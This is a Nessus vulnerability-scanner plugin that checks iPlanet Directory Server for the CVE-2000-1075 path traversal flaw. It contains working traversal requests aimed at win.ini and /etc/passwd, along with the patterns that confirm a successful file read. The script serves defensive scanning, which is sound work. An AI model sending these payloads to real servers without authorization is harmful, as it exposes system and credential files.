#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10589);
 script_version ("$Revision: 1.13 $");
 script_bugtraq_id(1839);
 script_cve_id("CVE-2000-1075");
 name["english"] = "iPlanet Directory Server traversal";
 name["francais"] = "iPlanet Directory Server traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending /\../\../
in front on the file name.

Solution : See http://www.iplanet.com/downloads/patches/index.html
Risk factor : High";

 desc["francais"] = "Il est possible de lire
n'importe quel fichier sur la machine distante
en ajoutant des points et des anti-slashs devant leur noms,
tels que /\../\../


Solution : cf http://www.iplanet.com/downloads/patches/index.html

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "/\../\../\file.txt";
 summary["francais"] = "/\../\../\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 8100);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

function check(port)
{
 req1 = http_get(item:string("/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini"),
		port:port);
		
 req2 = http_get(item:string("/ca/..\\..\\..\\..\\..\\..\\winnt/\\win.ini"),
		port:port);
 req3 = http_get(item:string("/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd"),
		port:port);


 r = http_keepalive_send_recv(port:port, data:req1);
 if( r == NULL ) return(0);
 
 if("[windows]" >< r){
 	security_hole(port);
	return(0);
	}
	
 r = http_keepalive_send_recv(port:port, data:req2);
 if( r == NULL ) exit(0);
 
 if("[fonts]" >< r){
 	security_hole(port);
	return(0);
	}
	
  r = http_keepalive_send_recv(port:port, data:req3);
  if( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  	security_hole(port);
	return(0);
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8100);

foreach port (ports)
{
 check(port:port);
}
